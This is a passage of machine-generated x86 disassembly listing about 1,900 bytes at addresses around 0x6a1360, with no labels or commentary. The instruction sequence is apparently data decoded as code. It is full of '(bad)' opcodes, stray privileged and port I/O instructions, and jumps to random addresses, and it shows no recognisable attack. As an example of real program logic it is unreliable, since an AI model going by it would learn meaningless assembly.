  6a135f:	lods   al,BYTE PTR ds:[esi]
  6a1360:	pop    edi
  6a1361:	adc    edx,DWORD PTR [ebx-0x27]
  6a1364:	push   es
  6a1365:	mov    ds:0x211b5897,al
  6a136a:	adc    ebp,esp
  6a136c:	pop    ax
  6a136e:	popa   
  6a136f:	inc    ebp
  6a1370:	xor    edi,edx
  6a1372:	data16 cmp BYTE PTR [ebx+0x3a],dh
  6a1376:	mov    ch,0xcf
  6a1378:	fwait
  6a1379:	enter  0xcb9f,0x95
  6a137d:	sub    eax,0xd1c0c4c2
  6a1382:	sbb    al,0xbc
  6a1384:	jp     0x6a13fc
  6a1386:	cmp    BYTE PTR [esi],ch
  6a1388:	adc    esi,DWORD PTR [ebx-0x9283d88]
  6a138e:	adc    DWORD PTR ds:0x1d80f97e,esi
  6a1394:	sbb    BYTE PTR [ecx],0xc5
  6a1397:	cmp    DWORD PTR [edx],ebx
  6a1399:	addr16 popf 
  6a139b:	popf   
  6a139c:	xor    DWORD PTR [eax-0xf],0x62440700
  6a13a3:	push   esp
  6a13a4:	xlat   BYTE PTR ds:[ebx]
  6a13a5:	call   0x6d9ba412
  6a13aa:	mov    ebp,0x660119a1
  6a13af:	mov    eax,0x245bd2fd
  6a13b4:	pop    ss
  6a13b5:	cmp    BYTE PTR [esi-0x2c129495],cl
  6a13bb:	push   edi
  6a13bc:	pop    esp
  6a13bd:	sbb    eax,DWORD PTR [esi-0x7d]
  6a13c0:	pop    esp
  6a13c1:	iret   
  6a13c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a13c3:	mov    gs,WORD PTR [ecx-0x2eed9d17]
  6a13c9:	sbb    al,0xc8
  6a13cb:	or     BYTE PTR [esp+ecx*2],cl
  6a13ce:	push   cs
  6a13cf:	add    esi,eax
  6a13d1:	jmp    0x32f2:0x82b1d7a
  6a13d8:	test   al,0xa7
  6a13da:	mov    bh,0xe1
  6a13dc:	xchg   esp,eax
  6a13dd:	and    bh,al
  6a13df:	popa   
  6a13e0:	dec    edi
  6a13e1:	div    DWORD PTR [edx-0x1f]
  6a13e4:	popa   
  6a13e5:	pop    ecx
  6a13e6:	ds push esi
  6a13e8:	pop    edi
  6a13e9:	popa   
  6a13ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a13eb:	mov    edi,0xacb1b111
  6a13f0:	mov    ebx,0x7cf77568
  6a13f5:	push   edx
  6a13f6:	mov    WORD PTR [eax+0x77b37fa4],fs
  6a13fc:	cs mov ah,0x41
  6a13ff:	mov    ebx,0x6b1a0219
  6a1404:	adc    ch,bh
  6a1406:	sub    cl,BYTE PTR [ecx]
  6a1408:	pop    esi
  6a1409:	nop
  6a140a:	push   eax
  6a140b:	dec    edi
  6a140c:	sub    BYTE PTR [ecx-0x4d576f81],ch
  6a1412:	aam    0x26
  6a1414:	pop    ebp
  6a1415:	out    dx,eax
  6a1416:	pop    ecx
  6a1417:	mov    cl,0x31
  6a1419:	dec    esp
  6a141a:	xchg   BYTE PTR [eax+0x40a2c334],cl
  6a1420:	iret   
  6a1421:	out    0x34,al
  6a1423:	dec    edx
  6a1424:	rcr    DWORD PTR [eax+eax*2-0x6d],0x41
  6a1429:	jae    0x6a1410
  6a142b:	fnstcw WORD PTR [ecx+0x43]
  6a142e:	nop
  6a142f:	mov    esi,0xb0909dbe
  6a1434:	popf   
  6a1435:	mov    bl,0x66
  6a1437:	aam    0xf2
  6a1439:	push   ecx
  6a143a:	ins    DWORD PTR es:[edi],dx
  6a143b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a143c:	ins    DWORD PTR es:[edi],dx
  6a143d:	mov    bh,0xaf
  6a143f:	mov    esi,0x7d18e54
  6a1444:	push   esp
  6a1445:	popf   
  6a1446:	jne    0x6a14a8
  6a1448:	test   BYTE PTR [edx+edx*1-0x68],dh
  6a144c:	pushf  
  6a144d:	test   ch,bh
  6a144f:	add    esp,DWORD PTR [ecx+0x48989ba6]
  6a1455:	sbb    ecx,DWORD PTR ds:0x39c6fa55
  6a145b:	in     eax,0x3b
  6a145d:	fwait
  6a145e:	in     al,dx
  6a145f:	pusha  
  6a1460:	push   cs
  6a1461:	mov    al,ds:0x486c7af8
  6a1466:	sbb    DWORD PTR [ecx],ebx
  6a1468:	mov    WORD PTR [ebx+0x7f],fs
  6a146b:	fiadd  DWORD PTR [ebx+edx*2-0x5eff0388]
  6a1472:	pop    ebp
  6a1473:	stos   DWORD PTR es:[edi],eax
  6a1474:	pop    es
  6a1475:	fld    TBYTE PTR [esi-0x72ce8480]
  6a147b:	loop   0x6a1485
  6a147d:	sti    
  6a147e:	inc    ebx
  6a147f:	mov    bh,BYTE PTR [esi-0x2ccf6857]
  6a1485:	(bad)  
  6a1487:	add    DWORD PTR [esi-0x5f94313b],edi
  6a148d:	hlt    
  6a148e:	fmul   QWORD PTR [ebx-0x47]
  6a1491:	rcl    al,0xd5
  6a1494:	lahf   
  6a1495:	or     esp,DWORD PTR [edi+0x5c]
  6a1498:	in     eax,0x63
  6a149a:	adc    al,0xb9
  6a149c:	call   0xed619a4d
  6a14a1:	inc    eax
  6a14a2:	mov    ecx,0xf6929dbe
  6a14a7:	inc    edx
  6a14a8:	cmc    
  6a14a9:	xchg   BYTE PTR [ebx-0x73d0a991],cl
  6a14af:	mov    edi,0xd44df792
  6a14b4:	xor    al,0xd1
  6a14b6:	jle    0x6a143d
  6a14b8:	mov    ecx,0x87005308
  6a14bd:	bound  ebx,QWORD PTR [edi-0x2380319e]
  6a14c3:	push   es
  6a14c4:	fs pop edi
  6a14c6:	fdivrp st(1),st
  6a14c8:	or     cl,ch
  6a14ca:	jecxz  0x6a14a0
  6a14cc:	aaa    
  6a14cd:	jecxz  0x6a14f7
  6a14cf:	push   0x7
  6a14d1:	ret    
  6a14d2:	pop    ds
  6a14d3:	mov    edi,0x979c7ef
  6a14d8:	cmp    al,0xc3
  6a14da:	xor    al,BYTE PTR [edi]
  6a14dc:	xchg   esi,eax
  6a14dd:	mov    WORD PTR [edx+0x37438893],fs
  6a14e3:	push   esi
  6a14e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a14e5:	fst    DWORD PTR ds:0xbfe427c7
  6a14eb:	adc    eax,0xe7aa7ab5
  6a14f0:	mov    dh,0x39
  6a14f2:	cmp    al,0x23
  6a14f4:	addr16 push ecx
  6a14f6:	jb     0x6a14a5
  6a14f8:	sub    BYTE PTR [eax],0x7a
  6a14fb:	push   ecx
  6a14fc:	push   0xa31951dd
  6a1501:	xchg   edx,eax
  6a1502:	mov    ah,0x89
  6a1504:	xchg   ecx,eax
  6a1505:	repz popa 
  6a1507:	sahf   
  6a1508:	dec    eax
  6a1509:	and    bh,BYTE PTR [esi]
  6a150b:	sahf   
  6a150c:	arpl   WORD PTR [ebp-0x21],ax
  6a150f:	dec    esi
  6a1510:	addr16 pushf 
  6a1512:	mov    ch,0xf6
  6a1514:	dec    eax
  6a1515:	jb     0x6a14c8
  6a1517:	enter  0x13d4,0xb2
  6a151b:	scas   al,BYTE PTR es:[edi]
  6a151c:	and    edx,DWORD PTR [edx-0x26]
  6a151f:	int    0x53
  6a1521:	jo     0x6a1502
  6a1523:	in     eax,0x72
  6a1525:	adc    BYTE PTR [ecx+eax*2+0x7751d77f],cl
  6a152c:	daa    
  6a152d:	mov    ebp,0x4b7a58dd
  6a1532:	fstp   DWORD PTR [edx+0x4f]
  6a1535:	inc    esp
  6a1536:	mov    dl,0x53
  6a1538:	mov    edx,?
  6a153a:	xchg   ecx,eax
  6a153b:	pop    esi
  6a153c:	daa    
  6a153d:	mov    edi,DWORD PTR [edx-0x4149f30d]
  6a1543:	xor    bl,bh
  6a1545:	push   es
  6a1546:	dec    eax
  6a1547:	fdiv   DWORD PTR [ebx]
  6a1549:	fdivr  DWORD PTR [eax+0x1c]
  6a154c:	cli    
  6a154d:	imul   ebp,DWORD PTR [esi+0x65],0x71
  6a1551:	xor    dl,dl
  6a1553:	xor    DWORD PTR [eax+0x5dd4170b],0x9f29c47f
  6a155d:	mov    esi,0xf44035ad
  6a1562:	mov    DWORD PTR [edx+ebp*2-0x163f86f5],esi
  6a1569:	dec    esi
  6a156a:	sbb    al,0x14
  6a156c:	jno    0x6a15a5
  6a156e:	mov    WORD PTR [ebx-0x7e671645],?
  6a1574:	(bad)  
  6a1575:	pop    ss
  6a1576:	sub    esi,0x95f9268a
  6a157c:	fild   QWORD PTR [esi]
  6a157e:	daa    
  6a157f:	out    dx,al
  6a1580:	push   edi
  6a1581:	sub    BYTE PTR [edx+0x1a],ch
  6a1584:	jae    0x6a1546
  6a1586:	inc    edx
  6a1587:	ins    BYTE PTR es:[edi],dx
  6a1588:	out    dx,eax
  6a1589:	mov    ds:0x7b063773,al
  6a158e:	jmp    0xae93:0xa14fa954
  6a1595:	or     bl,dh
  6a1597:	push   esp
  6a1598:	nop
  6a1599:	mov    BYTE PTR [ebp-0x12],dh
  6a159c:	pusha  
  6a159d:	pop    ecx
  6a159e:	leave  
  6a159f:	int    0xba
  6a15a1:	out    dx,al
  6a15a2:	or     eax,DWORD PTR [ebx-0x21]
  6a15a5:	inc    edi
  6a15a6:	push   0x4e
  6a15a8:	(bad)  
  6a15a9:	sti    
  6a15aa:	inc    esp
  6a15ab:	jecxz  0x6a15f7
  6a15ad:	cmp    al,0x2d
  6a15af:	sar    al,1
  6a15b1:	js     0x6a15d5
  6a15b3:	dec    ebx
  6a15b4:	pop    ss
  6a15b5:	mov    bh,0x8d
  6a15b7:	lods   eax,DWORD PTR ds:[esi]
  6a15b8:	ins    DWORD PTR es:[edi],dx
  6a15b9:	and    BYTE PTR [edx],bh
  6a15bb:	xchg   BYTE PTR [ecx+eax*8-0x2e],dh
  6a15bf:	mov    esi,cs
  6a15c1:	inc    ecx
  6a15c2:	mov    al,ds:0x3eddc65b
  6a15c7:	mov    gs,WORD PTR gs:[esi+edx*4+0x6a6c1827]
  6a15cf:	aad    0xac
  6a15d1:	ds inc edx
  6a15d3:	mov    dl,0xb2
  6a15d5:	pop    ebp
  6a15d6:	xchg   edi,eax
  6a15d7:	add    BYTE PTR [ebx-0x35ae2b3b],dh
  6a15dd:	jp     0x6a1639
  6a15df:	jl     0x6a15d2
  6a15e1:	dec    ebx
  6a15e2:	xchg   DWORD PTR [edi-0x80],ebp
  6a15e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a15e6:	into   
  6a15e7:	sbb    BYTE PTR [edi],ch
  6a15e9:	jae    0x6a1668
  6a15eb:	(bad)  [edi-0x14]
  6a15ee:	dec    ebp
  6a15ef:	lods   al,BYTE PTR ds:[esi]
  6a15f0:	pusha  
  6a15f1:	or     DWORD PTR [edx+edi*8+0x66888c40],ecx
  6a15f8:	mov    al,cl
  6a15fa:	fst    st(2)
  6a15fc:	in     eax,dx
  6a15fd:	dec    ebp
  6a15fe:	lock repz inc edi
  6a1601:	cmp    al,0x52
  6a1603:	loope  0x6a15c4
  6a1605:	cmp    dh,BYTE PTR [esi-0x57d8167d]
  6a160b:	inc    ecx
  6a160c:	add    al,0x5c
  6a160e:	mov    BYTE PTR [esi-0x6e6d5120],0x17
  6a1615:	repz mov bh,0xba
  6a1618:	ja     0x6a15bb
  6a161a:	and    ecx,esp
  6a161c:	test   DWORD PTR [ecx],eax
  6a161e:	adc    eax,0x75a336d2
  6a1623:	loopne 0x6a1680
  6a1625:	and    eax,0xc470f3f6
  6a162a:	aas    
  6a162b:	xor    BYTE PTR [edi],cl
  6a162d:	out    0x35,eax
  6a162f:	fs and dl,dh
  6a1632:	mov    ebx,0x92821b94
  6a1637:	out    dx,eax
  6a1638:	jmp    0x58c3:0x698ae627
  6a163f:	or     bl,BYTE PTR [ebx]
  6a1641:	xchg   esi,eax
  6a1642:	and    ebp,ebx
  6a1644:	jmp    0x6a1695
  6a1646:	mov    eax,0x5c5a40d6
  6a164b:	loope  0x6a1691
  6a164d:	pop    eax
  6a164e:	sub    al,0x24
  6a1650:	inc    esp
  6a1651:	daa    
  6a1652:	in     eax,0xd
  6a1654:	and    eax,0x479abe11
  6a1659:	add    al,0xdb
  6a165b:	add    DWORD PTR [esi],ebx
  6a165d:	inc    ebp
  6a165e:	iret   
  6a165f:	xchg   ebx,eax
  6a1660:	lods   eax,DWORD PTR ds:[esi]
  6a1662:	jl     0x6a168b
  6a1664:	dec    esp
  6a1665:	cmp    bh,BYTE PTR [edi-0x50ad8409]
  6a166b:	shl    DWORD PTR [edx],cl
  6a166d:	mov    esp,0xbcbeeaf0
  6a1672:	sar    DWORD PTR [edi+ebp*1+0x53bb3812],1
  6a1679:	fucomip st,st(0)
  6a167b:	and    eax,0xa898adb9
  6a1680:	sbb    al,0xa9
  6a1682:	fidiv  WORD PTR [ebx]
  6a1684:	mov    dh,BYTE PTR [ebx+0x62]
  6a1687:	shl    DWORD PTR [esi],0xec
  6a168a:	mov    edx,0x88e1ac49
  6a168f:	pop    ecx
  6a1690:	cdq    
  6a1691:	outs   dx,BYTE PTR ds:[esi]
  6a1692:	adc    cl,BYTE PTR [edi]
  6a1694:	pop    eax
  6a1695:	jmp    0xaf85d4b2
  6a169a:	in     al,dx
  6a169b:	cmp    BYTE PTR [esi+esi*4-0x2341e6c9],ah
  6a16a2:	mov    dh,0xbd
  6a16a4:	dec    ebx
  6a16a5:	rcl    DWORD PTR [eax+0x48],1
  6a16a8:	sub    eax,0x378291c0
  6a16ad:	mov    eax,ds:0xa85f729a
  6a16b2:	sbb    eax,0x1f5e8377
  6a16b7:	in     al,0xc8
  6a16b9:	fcmovu st,st(2)
  6a16bb:	sub    esi,0xcadb8dd
  6a16c1:	lahf   
  6a16c2:	(bad)  
  6a16c3:	es mov ecx,0x4def7a84
  6a16c9:	push   DWORD PTR [eax-0x61]
  6a16cc:	pop    edx
  6a16cd:	xor    al,0xa9
  6a16cf:	xchg   edx,eax
  6a16d0:	adc    ecx,DWORD PTR [ebp+ebx*8-0x70b691c6]
  6a16d7:	xor    al,0xf8
  6a16d9:	inc    ecx
  6a16da:	call   0x24c6273a
  6a16df:	push   edi
  6a16e0:	sub    al,0x44
  6a16e2:	imul   ecx,DWORD PTR [esi+edx*4+0xe21fc73],0x2d7bb61a
  6a16ed:	scas   eax,DWORD PTR es:[edi]
  6a16ee:	fs pop es
  6a16f0:	fwait
  6a16f1:	jp     0x6a170a
  6a16f3:	sbb    al,bh
  6a16f5:	aad    0x21
  6a16f7:	and    DWORD PTR [ebp-0x15ef2417],esi
  6a16fd:	sub    BYTE PTR [eax+ebp*8],ah
  6a1700:	data16 fidiv WORD PTR [esi-0x22d1d48e]
  6a1707:	jmp    0x52ab:0x645ea57f
  6a170e:	test   ebp,esi
  6a1710:	popa   
  6a1711:	add    eax,0x2ab90148
  6a1716:	shl    DWORD PTR [ebp+0x33],0x4a
  6a171a:	sub    ah,BYTE PTR [ebx-0x89a7383]
  6a1720:	aaa    
  6a1721:	leave  
  6a1722:	dec    ecx
  6a1723:	xchg   BYTE PTR [ecx],ch
  6a1725:	mov    DWORD PTR [edi],ecx
  6a1727:	cmp    BYTE PTR [ebx],dl
  6a1729:	cwde   
  6a172a:	cs mov ch,0xd8
  6a172d:	arpl   WORD PTR [ecx],dx
  6a172f:	test   eax,0x82e7e8f5
  6a1734:	mov    ecx,0xbf305865
  6a1739:	pop    esi
  6a173a:	mov    edx,es
  6a173c:	fild   DWORD PTR [edx+esi*4]
  6a173f:	add    DWORD PTR [esi],eax
  6a1741:	push   ebp
  6a1742:	ins    BYTE PTR es:[edi],dx
  6a1743:	outs   dx,DWORD PTR ds:[esi]
  6a1744:	out    0xba,eax
  6a1746:	loop   0x6a16f9
  6a1748:	mov    ds:0xbac2cb93,al
  6a174d:	cmp    ch,bl
  6a174f:	pop    ss
  6a1750:	mov    ch,BYTE PTR [ebp+0x70]
  6a1753:	mov    esp,0xd9349b28
  6a1758:	mov    bh,0xa3
  6a175a:	retf   0xaafa
  6a175d:	inc    edi
  6a175e:	shl    BYTE PTR [ecx+0x20b21e07],cl
  6a1764:	sbb    eax,0x85714625
  6a1769:	xchg   ebx,eax
  6a176a:	mov    ds:0x7ca64a15,eax
  6a176f:	and    DWORD PTR gs:[ebx-0x24],ebx
  6a1773:	scas   al,BYTE PTR es:[edi]
  6a1774:	and    eax,0x39d21c4d
  6a1779:	scas   al,BYTE PTR es:[edi]
  6a177a:	and    cl,BYTE PTR ds:0xa1c903d
  6a1780:	mov    ds:0x627b271,al
  6a1785:	mov    esp,0x4f5758bb
  6a178a:	inc    edi
  6a178b:	xchg   edx,eax
  6a178c:	cmp    bh,BYTE PTR [ebx+0x74]
  6a178f:	movaps xmm5,XMMWORD PTR [edi]
  6a1792:	adc    DWORD PTR [eax+0x543b8881],ebx
  6a1798:	mov    ds:0xa6c177c,al
  6a179d:	scas   al,BYTE PTR es:[edi]
  6a179e:	inc    ecx
  6a179f:	out    dx,eax
  6a17a0:	fsub   DWORD PTR [edi]
  6a17a2:	sub    cl,BYTE PTR [esi]
  6a17a4:	std    
  6a17a5:	push   ecx
  6a17a6:	test   ah,cl
  6a17a8:	xlat   BYTE PTR ds:[ebx]
  6a17a9:	mov    bh,0xba
  6a17ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a17ac:	add    al,0x7c
  6a17ae:	mov    dl,0x95
  6a17b0:	push   0xffffff85
  6a17b2:	push   ebp
  6a17b3:	jns    0x6a17e5
  6a17b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a17b6:	dec    edi
  6a17b7:	pop    edi
  6a17b8:	jae    0x6a1818
  6a17ba:	add    esp,edx
  6a17bc:	pop    ebx
  6a17bd:	inc    ebx
  6a17be:	repz shr BYTE PTR [ecx-0x334a3788],0xaa
  6a17c6:	loop   0x6a17d2
  6a17c8:	call   0x2aa812a5
  6a17cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a17ce:	cmp    cl,0xb3
  6a17d1:	mov    al,ds:0x63c10c9a
  6a17d6:	lods   eax,DWORD PTR ds:[esi]
  6a17d7:	(bad)  
  6a17d8:	xlat   BYTE PTR ds:[ebx]
  6a17d9:	ins    BYTE PTR es:[edi],dx
  6a17da:	xchg   esi,eax
  6a17db:	ds xor al,0xd7
  6a17de:	adc    eax,0xc9738d9d
  6a17e3:	push   cs
  6a17e4:	xchg   ebx,eax
  6a17e5:	or     DWORD PTR [esi],edi
  6a17e7:	out    dx,al
  6a17e8:	pop    ebx
  6a17e9:	inc    ebp
  6a17ea:	retf   
  6a17eb:	dec    ebp
  6a17ec:	adc    DWORD PTR [eax+0x17],ebp
  6a17ef:	outs   dx,DWORD PTR ds:[esi]
  6a17f0:	pop    eax
  6a17f1:	(bad)  
  6a17f3:	enter  0xe39f,0xd7
  6a17f7:	or     al,0xf8
  6a17f9:	jmp    0x9181fa34
  6a17fe:	inc    ebp
  6a17ff:	pusha  
  6a1800:	adc    BYTE PTR [edx-0x1e],0x9d
  6a1804:	mov    esi,0xea32d8e9
  6a1809:	cwde   
  6a180a:	mov    dh,0xca
  6a180c:	scas   eax,DWORD PTR es:[edi]
  6a180d:	imul   edi,ebp,0x4f
  6a1810:	inc    esi
  6a1811:	dec    ebp
  6a1812:	and    DWORD PTR [ecx],0x721e8439
  6a1818:	jae    0x6a17ec
  6a181a:	(bad)  
  6a181b:	ror    DWORD PTR ds:0x228dc04d,cl
  6a1821:	scas   al,BYTE PTR es:[edi]
  6a1822:	push   ebp
  6a1823:	and    DWORD PTR [eax-0x5c2ce908],ebp
  6a1829:	pcmpeqw mm2,QWORD PTR [edi+0x51c135a8]
  6a1830:	sub    dh,ch
  6a1832:	or     esi,esp
  6a1834:	cmp    al,0xd7
  6a1836:	mov    ds:0xed7f14f1,eax
  6a183b:	stos   DWORD PTR es:[edi],eax
  6a183c:	pop    ebp
  6a183d:	jge    0x6a1854
  6a183f:	sub    ch,BYTE PTR [edi]
  6a1841:	xlat   BYTE PTR ds:[ebx]
  6a1842:	jne    0x6a1871
  6a1844:	mov    esp,0xb8d749f2
  6a1849:	mov    cl,BYTE PTR [ebx]
  6a184b:	out    0x19,al
  6a184d:	sbb    BYTE PTR [ebx+ecx*4+0x7c],0x5b
  6a1852:	idiv   BYTE PTR [edi+0x35]
  6a1855:	xchg   ecx,eax
  6a1856:	inc    eax
  6a1857:	and    BYTE PTR [edx],bl
  6a1859:	mov    cl,0x0
  6a185b:	mov    ecx,0x496fab61
  6a1860:	imul   ecx,DWORD PTR [eax+0x54],0xffffffb6
  6a1864:	xor    ch,BYTE PTR [eax+0x7c]
  6a1867:	outs   dx,DWORD PTR ds:[esi]
  6a1868:	es or  eax,0x7552c0a8
  6a186e:	mov    edx,0xbf4f61dd
  6a1873:	test   eax,0xe85313f7
  6a1878:	imul   ebx,DWORD PTR [ecx-0x17],0x7f
  6a187c:	jb     0x6a18af
  6a187e:	mov    ebx,0x23524bba
  6a1883:	fcomp  DWORD PTR ds:0xf6f9458f
  6a1889:	test   DWORD PTR [edi-0x28069a7b],edx
  6a188f:	jns    0x6a185e
  6a1891:	rcl    BYTE PTR [edx-0x7a],1
  6a1894:	sbb    BYTE PTR [edx-0x23],ch
  6a1897:	imul   ecx,DWORD PTR [esi-0x43],0x1
  6a189b:	xor    edx,DWORD PTR ds:0x7a5066c3
  6a18a1:	loop   0x6a185e
  6a18a3:	lahf   
  6a18a4:	enter  0xfc3f,0x8a
  6a18a8:	jbe    0x6a189f
  6a18aa:	mov    BYTE PTR [edx-0x52f4d96c],ah
  6a18b0:	ss dec ebp
  6a18b2:	sbb    BYTE PTR [eax-0x15],0xa3
  6a18b6:	mov    edx,0x8c9da2f1
  6a18bb:	add    esi,DWORD PTR [esi-0x78]
  6a18be:	jae    0x6a1870
  6a18c0:	jp     0x6a188d
  6a18c2:	test   BYTE PTR [edi-0x7a8537c6],bl
  6a18c8:	push   cs
  6a18c9:	lock les ebx,FWORD PTR [eax]
  6a18cc:	ds mov bh,0xf0
  6a18cf:	jle    0x6a18f0
  6a18d1:	jb     0x6a1894
  6a18d3:	dec    ebx
  6a18d4:	mov    bl,0xe7
  6a18d6:	call   0x3a2a995e
  6a18db:	pop    edi
  6a18dc:	cmc    
  6a18dd:	mov    al,0xcb
  6a18df:	or     edi,DWORD PTR [eax+0x4b38b10]
  6a18e5:	or     al,0x4
  6a18e7:	fcom   QWORD PTR [ebx-0x9c7c2ae]
  6a18ed:	push   0x2d
  6a18ef:	int3   
  6a18f0:	mov    edi,0x59d71f7e
  6a18f5:	and    ecx,ebp
  6a18f7:	or     bh,al
  6a18f9:	fsubr  DWORD PTR [ecx-0x1]
  6a18fc:	ret    
  6a18fd:	imul   ebp,DWORD PTR es:[edi],0xffffffe5
  6a1901:	dec    bp
  6a1903:	(bad)
  6a1907:	push   0x6c5482ad
  6a190c:	jmp    0xf56:0x4abffaf4
  6a1913:	int3   
  6a1914:	push   cs
  6a1915:	aaa    
  6a1916:	mov    esp,0x7a51f0f1
  6a191b:	push   ecx
  6a191c:	daa    
  6a191d:	mov    BYTE PTR [ebx+0x56feedcb],bl
  6a1923:	out    dx,al
  6a1924:	dec    ebx
  6a1925:	add    al,0xa2
  6a1927:	push   ebx
  6a1928:	movaps xmm0,xmm4
  6a192b:	or     al,0x24
  6a192d:	jg     0x6a18b7
  6a192f:	dec    esi
  6a1930:	sar    DWORD PTR [ebp-0x360950cb],1
  6a1936:	scas   eax,DWORD PTR es:[edi]
  6a1937:	(bad)  
  6a1938:	xor    al,BYTE PTR [edi+0x37b0d9b3]
  6a193e:	nop
  6a193f:	xlat   BYTE PTR ds:[ebx]
  6a1940:	in     al,0x23
  6a1942:	les    esi,FWORD PTR [eax]
  6a1944:	sub    eax,0xb245fe4d
  6a1949:	xchg   ebx,eax
  6a194a:	mov    ah,BYTE PTR [esi]
  6a194c:	ret    0x17b9
  6a194f:	inc    eax
  6a1950:	xlat   BYTE PTR ds:[ebx]
  6a1951:	lds    esp,FWORD PTR [edi+0x5327d21c]
  6a1957:	mov    bh,0x90
  6a1959:	cmp    al,0x37
  6a195b:	cmp    ah,BYTE PTR [ecx+0x16]
  6a195e:	adc    DWORD PTR [edi-0x757cccba],0x84691c80
  6a1968:	ret    
  6a1969:	pop    eax
  6a196a:	push   ebp
  6a196b:	loopne 0x6a190a
  6a196d:	sti    
  6a196e:	sub    eax,0xae897b4f
  6a1973:	repz pop ebx
  6a1975:	js     0x6a18fa
  6a1977:	mov    ch,0xdf
  6a1979:	sub    edi,DWORD PTR [edx-0x69]
  6a197c:	iret   
  6a197d:	sub    edi,edi
  6a197f:	push   cs
  6a1980:	mov    esi,0x601df85
  6a1985:	mov    al,ds:0xa02c3f27
  6a198a:	mov    ebx,0x5880f492
  6a198f:	push   es
  6a1990:	sub    al,0xcf
  6a1992:	xchg   DWORD PTR [ecx],ecx
  6a1994:	imul   ebx,DWORD PTR [edx-0x70121117],0x7cf4ab79
  6a199e:	xchg   esp,eax
  6a199f:	shl    DWORD PTR [ebp+0x48307893],1
  6a19a5:	js     0x6a1985
  6a19a7:	rcl    BYTE PTR [eax+0x78],cl
  6a19aa:	pushf  
  6a19ab:	aaa    
  6a19ac:	jmp    0x67c990e3
  6a19b1:	cs jmp 0x85adbaa7
  6a19b7:	xchg   dh,bl
  6a19b9:	popa   
  6a19ba:	cmp    edx,DWORD PTR [ebp+0x6de18e97]
  6a19c0:	clc    
  6a19c1:	sub    eax,0x80cc6057
  6a19c6:	or     BYTE PTR [esi+0x6f],ah
  6a19c9:	loop   0x6a197e
  6a19cb:	xlat   BYTE PTR ds:[ebx]
  6a19cc:	ja     0x6a19fb
  6a19ce:	mov    dl,0x22
  6a19d0:	dec    eax
  6a19d1:	retf   0xe535
  6a19d4:	imul   esp,ecx,0xd7d9fee
  6a19da:	je     0x6a195d
  6a19dc:	mov    ah,0x70
  6a19de:	(bad)  
  6a19df:	cmp    al,0x52
  6a19e1:	adc    al,0x11
  6a19e3:	sub    BYTE PTR [edx-0x5d],dl
  6a19e6:	repz cli 
  6a19e8:	mov    edi,0xf33da5ea
  6a19ed:	add    eax,0x24789cab
  6a19f2:	loop   0x6a1a55
  6a19f4:	sbb    eax,0x6b1581ca
  6a19f9:	sub    ecx,DWORD PTR [eax]
  6a19fb:	ret    0xb014
  6a19fe:	test   eax,0xc4402690
  6a1a03:	push   esi
  6a1a04:	das    
  6a1a05:	inc    esi
  6a1a06:	int    0x2a
  6a1a08:	mov    dh,0x9c
  6a1a0a:	ins    BYTE PTR es:[edi],dx
  6a1a0b:	in     al,dx
  6a1a0c:	inc    ebp
  6a1a0d:	push   ecx
  6a1a0e:	(bad)  
  6a1a0f:	(bad)  
  6a1a10:	retf   
  6a1a11:	(bad)  [edx]
  6a1a13:	jl     0x6a1a53
  6a1a15:	mov    eax,ds:0xe853c941
  6a1a1a:	jmp    0x408d7def
  6a1a1f:	not    edx
  6a1a21:	xor    al,0xc3
  6a1a23:	in     al,0xff
  6a1a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a1a26:	cs inc edx
  6a1a28:	fsub   st,st(2)
  6a1a2a:	jg     0x6a1aaa
  6a1a2c:	sbb    al,0xa9
  6a1a2e:	dec    esp
  6a1a2f:	mov    DWORD PTR [esi],eax
  6a1a31:	push   ebx
  6a1a32:	cmp    eax,0xcea4d2a3
  6a1a37:	mov    esi,0x84b5fbb3
  6a1a3c:	int3   
  6a1a3d:	xor    ah,BYTE PTR [ebp+0x6459967e]
  6a1a43:	push   ecx
  6a1a44:	in     eax,0x64
  6a1a46:	mov    ebx,0xe7b13e1
  6a1a4b:	cmp    dl,BYTE PTR [esp]
  6a1a4e:	lds    ecx,FWORD PTR [ebp-0x80]
  6a1a51:	rol    BYTE PTR [edx+0x8f2e9ad],0x38
  6a1a58:	fwait
  6a1a59:	xchg   esp,eax
  6a1a5a:	xlat   BYTE PTR ds:[ebx]
  6a1a5b:	das    
  6a1a5c:	inc    esp
  6a1a5d:	hlt    
  6a1a5e:	add    esp,DWORD PTR [ebx-0x5]
  6a1a61:	rol    DWORD PTR [edi-0x6e],1
  6a1a64:	in     al,dx
  6a1a65:	push   esp
  6a1a66:	adc    BYTE PTR [edx],ah
  6a1a68:	int    0x96
  6a1a6a:	adc    DWORD PTR ds:0xd74bbfef,0x75db8c8f
  6a1a74:	xor    dh,BYTE PTR [ecx+ecx*8-0xc994403]
  6a1a7b:	js     0x6a1a5f
  6a1a7d:	xchg   esi,eax
  6a1a7e:	repnz sahf 
  6a1a80:	lods   al,BYTE PTR ds:[esi]
  6a1a81:	nop
  6a1a82:	xchg   DWORD PTR [edx],eax
  6a1a84:	fidiv  WORD PTR [edi-0x335b82db]
  6a1a8a:	pop    ecx
  6a1a8b:	adc    edi,DWORD PTR [esi+0x115131ef]
  6a1a91:	push   0xffffffa2
  6a1a93:	enter  0xa712,0x9e
  6a1a97:	add    DWORD PTR [ebx],0x26
  6a1a9a:	test   DWORD PTR [ebx],edx
  6a1a9c:	ja     0x6a1a82
  6a1a9e:	xlat   BYTE PTR ds:[ebx]
  6a1a9f:	iret   
  6a1aa0:	pop    eax
  6a1aa1:	sub    eax,0x2e8a0606
  6a1aa6:	jge    0x6a1af7
  6a1aa8:	into   
  6a1aa9:	push   edi
  6a1aaa:	test   DWORD PTR [ebx],ebx
  6a1aac:	shl    BYTE PTR [edx+esi*2+0x58789e8],1
  6a1ab3:	inc    ecx
  6a1ab4:	mov    ecx,0x81c32b65
  6a1ab9:	jae    0x6a1b23
  6a1abb:	(bad)
  6a1abf:	sti    
  6a1ac0:	mov    edi,0xce9c4d36
  6a1ac5:	mov    al,0x38
  6a1ac7:	xchg   edx,eax
  6a1ac8:	das    
